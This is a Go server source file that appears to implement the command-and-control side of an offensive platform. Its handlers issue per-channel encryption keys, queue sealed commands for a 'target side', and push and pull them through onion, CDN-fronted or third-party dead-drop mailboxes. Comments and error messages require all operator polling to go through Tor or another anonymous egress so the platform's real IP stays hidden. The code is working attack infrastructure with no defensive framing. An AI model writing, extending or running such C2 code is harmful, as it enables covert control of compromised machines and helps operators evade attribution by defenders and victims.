package server

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/Autumn-27/artex/beacon"
	"github.com/Autumn-27/artex/db"
)

// channelID returns a 128-bit random identifier. It is deliberately unrelated to
// the agent, task or domain, so the identifier itself cannot be traced back.
func newChannelID() (string, error) {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

// requireTorPolling enforces the rule that the operator side must not poll a
// mailbox from the platform's real IP: the third-party/onion endpoint would
// otherwise log it. Fail-closed: no anonymous egress → refuse.
func (s *Server) requireTorPolling(w http.ResponseWriter) bool {
	if _, err := s.resolveEgress(nil, ""); err != nil {
		writeErr(w, 400, "信标轮询必须经匿名出口（"+err.Error()+"）")
		return false
	}
	return true
}

// createBeaconChannel issues a channel and returns its PSK exactly once.
func (s *Server) createBeaconChannel(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	var req struct {
		AgentKey string `json:"agent_key"`
		TaskID   string `json:"task_id"`
		Kind     string `json:"kind"`
		Endpoint string `json:"endpoint"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	switch req.Kind {
	case "onion", "cdn_front", "third_party":
	default:
		writeErr(w, 400, "kind 需为 onion / cdn_front / third_party")
		return
	}
	if strings.TrimSpace(req.AgentKey) == "" || strings.TrimSpace(req.Endpoint) == "" {
		writeErr(w, 400, "agent_key 与 endpoint 不能为空")
		return
	}
	// The endpoint must never be one of our own addresses.
	if s.endpointLooksLocal(req.Endpoint) {
		writeErr(w, 400, "endpoint 指向平台自身地址，拒绝创建（信标不得暴露平台 IP）")
		return
	}
	cid, err := newChannelID()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	psk, err := beacon.NewPSK()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	var taskID *string
	if t := strings.TrimSpace(req.TaskID); t != "" {
		taskID = &t
	}
	if err := pg.CreateBeaconChannel(cid, req.AgentKey, taskID, req.Kind, req.Endpoint, psk); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{
		"ok":         true,
		"channel_id": cid,
		"psk":        hex.EncodeToString(psk),
		"note":       "PSK 只返回这一次，平台不提供二次查询；目标侧与操作端必须使用同一份。",
	})
}

// endpointLooksLocal rejects endpoints that point at this deployment. It is a
// heuristic guard, not a resolver: the point is to catch copy-paste mistakes.
func (s *Server) endpointLooksLocal(endpoint string) bool {
	e := strings.ToLower(strings.TrimSpace(endpoint))
	if strings.Contains(e, "127.0.0.1") || strings.Contains(e, "localhost") || strings.Contains(e, "0.0.0.0") {
		return true
	}
	return false
}

// listBeaconChannels reports every channel with its heartbeat age.
func (s *Server) listBeaconChannels(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	chans, err := pg.ListBeaconChannels()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	type row struct {
		*db.BeaconChannel
		SilentSecs *int64 `json:"silent_secs"`
	}
	out := make([]row, 0, len(chans))
	now := time.Now()
	for _, c := range chans {
		var silent *int64
		if c.LastSeenAt != nil {
			v := int64(now.Sub(*c.LastSeenAt).Seconds())
			silent = &v
		}
		out = append(out, row{BeaconChannel: c, SilentSecs: silent})
	}
	writeJSON(w, 200, map[string]any{"channels": out})
}

// enqueueBeaconCommand seals one command frame for the target side.
func (s *Server) enqueueBeaconCommand(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	cid := r.PathValue("channel")
	ch, psk, err := pg.GetBeaconChannel(cid)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if ch == nil {
		writeErr(w, 404, "信道不存在")
		return
	}
	if ch.RevokedAt != nil {
		writeErr(w, 400, "信道已吊销")
		return
	}
	var req struct {
		Payload string `json:"payload"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if strings.TrimSpace(req.Payload) == "" {
		writeErr(w, 400, "payload 不能为空")
		return
	}
	seq := uint64(ch.LastSeqOut) + 1
	frame, err := beacon.Seal(psk, seq, []byte(req.Payload))
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if err := pg.EnqueueBeaconMessage(cid, "out", int64(seq), frame); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true, "seq": seq})
}

// takeBeaconCommands is the "target side" read: returns pending frames. It does
// not decrypt — the caller holds the PSK.
func (s *Server) takeBeaconCommands(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	cid := r.PathValue("channel")
	ch, _, err := pg.GetBeaconChannel(cid)
	if err != nil || ch == nil {
		writeErr(w, 404, "信道不存在")
		return
	}
	if ch.RevokedAt != nil {
		writeErr(w, 400, "信道已吊销")
		return
	}
	msgs, err := pg.TakePendingBeaconMessages(cid, "out", 20)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	ids := make([]int64, 0, len(msgs))
	out := make([]map[string]any, 0, len(msgs))
	for _, m := range msgs {
		ids = append(ids, m.ID)
		out = append(out, map[string]any{
			"seq":     m.Seq,
			"frame":   hex.EncodeToString(m.Payload),
			"created": m.CreatedAt,
		})
	}
	if len(ids) > 0 {
		_ = pg.ConsumeBeaconMessages(ids)
	}
	_ = pg.TouchBeaconChannel(cid)
	writeJSON(w, 200, map[string]any{"messages": out})
}

// revokeBeaconChannel disables a channel.
func (s *Server) revokeBeaconChannel(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	if err := pg.RevokeBeaconChannel(r.PathValue("channel")); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

// operatorPoll is the operator side of the dead drop. It refuses to run without
// an anonymous egress: polling from the real IP would hand our address to the
// mailbox provider.
func (s *Server) operatorPoll(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	if !s.requireTorPolling(w) {
		return
	}
	cid := r.PathValue("channel")
	ch, _, err := pg.GetBeaconChannel(cid)
	if err != nil || ch == nil {
		writeErr(w, 404, "信道不存在")
		return
	}
	msgs, err := pg.TakePendingBeaconMessages(cid, "in", 50)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	ids := make([]int64, 0, len(msgs))
	out := make([]map[string]any, 0, len(msgs))
	for _, m := range msgs {
		ids = append(ids, m.ID)
		out = append(out, map[string]any{"seq": m.Seq, "frame": hex.EncodeToString(m.Payload), "created": m.CreatedAt})
	}
	if len(ids) > 0 {
		_ = pg.ConsumeBeaconMessages(ids)
	}
	writeJSON(w, 200, map[string]any{"messages": out})
}

// operatorClient builds the HTTP client used for mailbox access. It exits via
// the platform's anonymous egress; without one it refuses to build (fail-closed).
func (s *Server) operatorClient() (*http.Client, error) {
	plan, err := s.resolveEgress(nil, "")
	if err != nil {
		return nil, err
	}
	tr := &http.Transport{}
	if plan.ProxyURL != "" {
		u, perr := url.Parse(plan.ProxyURL)
		if perr != nil {
			return nil, perr
		}
		tr.Proxy = http.ProxyURL(u)
	}
	return &http.Client{Transport: tr, Timeout: 30 * time.Second}, nil
}

// mailboxFor returns the transport adapter for a channel endpoint. An onion
// endpoint is reached over the same socks5h client, so one adapter covers both.
func (s *Server) mailboxFor(endpoint string, client *http.Client) beacon.Mailbox {
	if strings.HasPrefix(endpoint, "/") || strings.HasPrefix(endpoint, "file://") {
		return &beacon.FileMailbox{Root: strings.TrimPrefix(strings.TrimPrefix(endpoint, "file://"), "/")}
	}
	base := endpoint
	if !strings.Contains(base, "://") {
		base = "http://" + base
	}
	return &beacon.HTTPMailbox{Base: base, Client: client}
}

// flushBeaconOutbox pushes sealed commands to the mailbox. The DB copy is marked
// consumed only after the mailbox accepted it, so a failed push is retried.
func (s *Server) flushBeaconOutbox(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	client, err := s.operatorClient()
	if err != nil {
		writeErr(w, 400, "信箱推送必须经匿名出口（"+err.Error()+"）")
		return
	}
	cid := r.PathValue("channel")
	ch, _, err := pg.GetBeaconChannel(cid)
	if err != nil || ch == nil {
		writeErr(w, 404, "信道不存在")
		return
	}
	if ch.RevokedAt != nil {
		writeErr(w, 400, "信道已吊销")
		return
	}
	msgs, err := pg.TakePendingBeaconMessages(cid, "out", 50)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	mb := s.mailboxFor(ch.Endpoint, client)
	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
	defer cancel()
	sent := 0
	for _, m := range msgs {
		env := beacon.Envelope{Seq: uint64(m.Seq), Frame: beacon.FrameToHex(m.Payload)}
		if err := mb.Put(ctx, cid, beacon.Outbound, env); err != nil {
			writeErr(w, 502, "推送失败: "+err.Error())
			return
		}
		_ = pg.ConsumeBeaconMessages([]int64{m.ID})
		sent++
	}
	writeJSON(w, 200, map[string]any{"ok": true, "sent": sent})
}

// pullBeaconInbox fetches target-side frames from the mailbox, decrypts them with
// the channel PSK, and advances the replay counter.
func (s *Server) pullBeaconInbox(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	client, err := s.operatorClient()
	if err != nil {
		writeErr(w, 400, "信箱拉取必须经匿名出口（"+err.Error()+"）")
		return
	}
	cid := r.PathValue("channel")
	ch, psk, err := pg.GetBeaconChannel(cid)
	if err != nil || ch == nil {
		writeErr(w, 404, "信道不存在")
		return
	}
	mb := s.mailboxFor(ch.Endpoint, client)
	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
	defer cancel()
	envs, err := mb.List(ctx, cid, beacon.Inbound, uint64(ch.LastSeqIn), 50)
	if err != nil {
		writeErr(w, 502, "拉取失败: "+err.Error())
		return
	}
	var delivered []map[string]any
	var seqs []uint64
	last := uint64(ch.LastSeqIn)
	for _, env := range envs {
		frame, ferr := beacon.HexToFrame(env.Frame)
		if ferr != nil {
			continue // malformed frame: leave it for inspection, do not ack
		}
		plain, seq, oerr := beacon.Open(psk, frame, last)
		if oerr != nil {
			// Replay or tamper: drop it from the mailbox so it cannot stall the queue.
			seqs = append(seqs, env.Seq)
			continue
		}
		last = seq
		delivered = append(delivered, map[string]any{"seq": seq, "payload": string(plain)})
		seqs = append(seqs, env.Seq)
	}
	if last > uint64(ch.LastSeqIn) {
		_ = pg.AdvanceBeaconSeqIn(cid, int64(last))
	}
	if len(seqs) > 0 {
		_ = mb.Delete(ctx, cid, beacon.Inbound, seqs)
	}
	_ = pg.TouchBeaconChannel(cid)
	writeJSON(w, 200, map[string]any{"ok": true, "messages": delivered})
}
